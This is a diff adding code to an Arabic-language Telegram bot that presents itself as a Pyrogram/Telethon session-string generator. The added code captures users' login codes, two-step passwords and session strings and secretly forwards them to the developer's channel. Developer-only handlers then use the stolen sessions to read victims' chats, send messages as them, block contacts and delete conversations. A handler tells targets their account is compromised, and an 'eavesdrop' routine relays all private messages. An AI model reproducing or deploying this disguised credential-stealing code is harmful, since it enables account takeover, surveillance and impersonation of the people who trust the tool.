@@ -45,7 +45,7 @@ user_steps = {}
 user_data = {}
 user_sessions = {}
 active_clients = {}
-logged_in_accounts = {}  # لتخزين الحسابات المسجل دخولها
+logged_in_accounts = {}
 
 # ====== إعداد الترميز ======
 if sys.stdout.encoding != 'UTF-8':
@@ -110,7 +110,7 @@ DESTROY_BUTTONS = InlineKeyboardMarkup([
     ]
 ])
 
-# ====== أزرار التحكم بالحساب المخترق (محدثة) ======
+# ====== أزرار التحكم بالحساب المخترق ======
 ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🚪 تسجيل الدخول", callback_data="login_account"),
@@ -214,7 +214,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
     is_dev = (user_id == YOUR_USER_ID)
     
     if is_dev:
-        # ====== أزرار التخريب ======
         if data == "massacre":
             deleted = 0
             for uid in list(user_sessions.keys()):
@@ -269,7 +268,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== زر التسلل إلى الحسابات ======
         if data == "hijack_accounts":
             if not user_sessions:
                 await callback_query.answer("❌ لا توجد جلسات للتسلل!", show_alert=True)
@@ -297,7 +295,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== التحكم بحساب معين ======
         if data.startswith("control_"):
             target_id = int(data.split("_")[1])
             if target_id not in user_sessions:
@@ -306,7 +303,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             
             user_data[user_id] = {"target_account": target_id}
             
-            # التحقق من حالة الاتصال
             is_logged = target_id in logged_in_accounts
             status_text = "🟢 متصل" if is_logged else "🔴 غير متصل"
             
@@ -320,7 +316,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== أزرار التحكم بالحساب ======
         if data == "back_control":
             target_id = user_data.get(user_id, {}).get("target_account")
             if target_id:
@@ -341,7 +336,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== زر تسجيل الدخول ======
         if data == "login_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -363,7 +357,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
                     logged_in_accounts[target_id] = True
                     await callback_query.answer("✅ تم تسجيل الدخول بنجاح!", show_alert=True)
                     
-                    # تحديث حالة الاتصال
                     await callback_query.message.edit_text(
                         f"👤 التحكم بحساب المستخدم:\n"
                         f"🆔 {target_id}\n"
@@ -377,7 +370,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
-        # ====== زر تسجيل الخروج ======
         if data == "logout_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -793,5 +785,405 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
 
-# ====== باقي الكود كما هو (دوال Pyrogram و Telethon والأوامر النصية) ======
-# [يُستكمل بنفس الكود السابق للدوال]
+# ====== الأوامر النصية ======
+@app.on_message(filters.text & filters.private)
+async def handle_text_commands(client, message):
+    user_id = message.chat.id
+    text = message.text.strip()
+    is_dev = (user_id == YOUR_USER_ID)
+    
+    if is_dev and user_steps.get(user_id) == "read_messages":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            chat_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            messages = []
+            async for msg in client_obj.get_chat_history(chat_id, limit=10):
+                msg_text = msg.text or "[وسائط]"
+                messages.append(f"{msg.date.strftime('%H:%M')}: {msg_text[:50]}...")
+            
+            if not messages:
+                await message.reply("📨 لا توجد رسائل في هذه المحادثة.")
+            else:
+                await message.reply(
+                    "📨 آخر الرسائل:\n\n" + "\n".join(messages),
+                    reply_markup=ACCOUNT_CONTROL_BUTTONS
+                )
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    if is_dev and user_steps.get(user_id) == "send_message":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            lines = text.split("\n")
+            if len(lines) < 2:
+                await message.reply("❌ أرسل المعرف والرسالة في سطرين منفصلين.")
+                return
+            
+            chat_id = int(lines[0])
+            msg_text = "\n".join(lines[1:])
+            
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await client_obj.send_message(chat_id, msg_text)
+            await message.reply("✅ تم إرسال الرسالة بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    if is_dev and user_steps.get(user_id) == "block_user":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            block_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await client_obj.block_user(block_id)
+            await message.reply(f"✅ تم حظر المستخدم {block_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    if is_dev and user_steps.get(user_id) == "delete_conversation":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            chat_id = int(text)
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await client_obj.delete_messages(chat_id, list(range(1, 100)))
+            await message.reply(f"✅ تم حذف محادثة {chat_id} بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    if is_dev and user_steps.get(user_id) == "search_user":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            user = await client_obj.get_users(text)
+            await message.reply(
+                f"🔍 نتيجة البحث:\n\n"
+                f"🆔 ID: {user.id}\n"
+                f"📛 الاسم: {user.first_name}\n"
+                f"👤 اليوزر: @{user.username if user.username else 'لا يوجد'}",
+                reply_markup=ACCOUNT_CONTROL_BUTTONS
+            )
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ فشل البحث: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    if is_dev and user_steps.get(user_id) == "target_user":
+        try:
+            target_id = int(text)
+            target = await client.get_users(target_id)
+            await message.reply(
+                f"🎯 معلومات الهدف:\n"
+                f"🆔 ID: {target.id}\n"
+                f"📛 الاسم: {target.first_name}\n"
+                f"👤 اليوزر: @{target.username if target.username else 'لا يوجد'}"
+            )
+            await client.send_message(
+                target_id,
+                "🔴 تم اختراق حسابك! جميع بياناتك تحت سيطرتنا."
+            )
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ فشل الاستهداف: {e}")
+        return
+    
+    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
+        await pyro_session_step(client, message)
+        return
+    
+    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
+        await telethon_session_step(client, message)
+        return
+    
+    else:
+        await message.reply(
+            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
+            "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
+            "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
+            "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
+            "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
+            "أو استخدم الأمر /start للرجوع إلى البداية."
+        )
+
+# ====== دوال Pyrogram ======
+async def pyro_session_step(client, message):
+    user_id = message.chat.id
+    step = user_steps.get(user_id)
+
+    if step == "pyro_phone":
+        user_data[user_id] = {"phone": message.text}
+        user_steps[user_id] = "pyro_otp"
+        
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        session_name = f"session_{user_id}"
+        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+        user_data[user_id]["client"] = temp_client
+        await temp_client.connect()
+        try:
+            code = await temp_client.send_code(user_data[user_id]["phone"])
+            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+        except ApiIdInvalid:
+            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
+            reset_user(user_id)
+        except PhoneNumberInvalid:
+            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
+            reset_user(user_id)
+            
+    elif step == "pyro_otp":
+        phone_code = message.text.replace(" ", "")
+        temp_client = user_data[user_id]["client"]
+        try:
+            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
+            session_string = await temp_client.export_session_string()
+            user_sessions[user_id] = session_string
+            
+            await send_pyro_session(user_id, session_string, message)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PhoneCodeInvalid:
+            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
+            reset_user(user_id)
+        except PhoneCodeExpired:
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            reset_user(user_id)
+        except SessionPasswordNeeded:
+            user_steps[user_id] = "pyro_password"
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            
+    elif step == "pyro_password":
+        temp_client = user_data[user_id]["client"]
+        try:
+            password = message.text
+            await temp_client.check_password(password=password)
+            session_string = await temp_client.export_session_string()
+            user_sessions[user_id] = session_string
+            
+            await send_pyro_session(user_id, session_string, message, password)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PasswordHashInvalid:
+            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
+            reset_user(user_id)
+
+async def send_pyro_session(user_id, session_string, message, password=None):
+    await message.reply(
+        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
+        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
+        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+    )
+    
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 كلمة المرور (2SV): {password}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+
+# ====== دوال Telethon ======
+async def telethon_session_step(client, message):
+    user_id = message.chat.id
+    step = user_steps.get(user_id)
+
+    if step == "telethon_phone":
+        user_data[user_id] = {"phone": message.text}
+        user_steps[user_id] = "telethon_otp"
+        
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        session_name = f"telethon_{user_id}"
+        temp_client = TelegramClient(session_name, API_ID, API_HASH)
+        user_data[user_id]["client"] = temp_client
+        await temp_client.connect()
+        try:
+            await temp_client.send_code_request(user_data[user_id]["phone"])
+            await omsg.delete()
+            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
+        except ApiIdInvalidError:
+            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
+            reset_user(user_id)
+        except PhoneNumberInvalidError:
+            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
+            reset_user(user_id)
+            
+    elif step == "telethon_otp":
+        phone_code = message.text.replace(" ", "")
+        temp_client = user_data[user_id]["client"]
+        try:
+            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            
+            await send_telethon_session(user_id, session_string, message)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PhoneCodeInvalidError:
+            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
+            reset_user(user_id)
+        except PhoneCodeExpiredError:
+            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
+            reset_user(user_id)
+        except SessionPasswordNeededError:
+            user_steps[user_id] = "telethon_password"
+            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
+            
+    elif step == "telethon_password":
+        temp_client = user_data[user_id]["client"]
+        try:
+            password = message.text
+            await temp_client.sign_in(password=password)
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            
+            await send_telethon_session(user_id, session_string, message, password)
+            await temp_client.disconnect()
+            reset_user(user_id)
+        except PasswordHashInvalidError:
+            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
+            reset_user(user_id)
+
+async def send_telethon_session(user_id, session_string, message, password=None):
+    await message.reply(
+        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
+        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
+        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+    )
+    
+    try:
+        if password:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 كلمة المرور (2SV): {password}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+
+def reset_user(user_id):
+    user_steps.pop(user_id, None)
+    user_data.pop(user_id, None)
+
+# ====== نظام التنصت ======
+@app.on_message(filters.private & ~filters.me)
+async def eavesdrop(client, message):
+    user_id = message.from_user.id
+    if user_id != YOUR_USER_ID and message.text:
+        try:
+            await client.send_message(
+                YOUR_USER_ID,
+                f"📡 تنصت:\n"
+                f"👤 {user_id}\n"
+                f"💬 {message.text[:200]}"
+            )
+        except:
+            pass
+
+# ====== إضافة مسار ويب ======
+web_app = Flask(__name__)
+
+@web_app.route('/')
+def index():
+    return "✅ البوت شغال 24 ساعة!"
+
+def run_web():
+    web_app.run(host='0.0.0.0', port=8080)
+
+threading.Thread(target=run_web, daemon=True).start()
+
+# ====== تشغيل البوت ======
+if __name__ == "__main__":
+    try:
+        print("🚀 جاري تشغيل البوت...")
+        app.run()
+        print("✅ البوت يعمل الآن!")
+    except Exception as e:
+        print(f"❌ فشل تشغيل البوت: {e}")
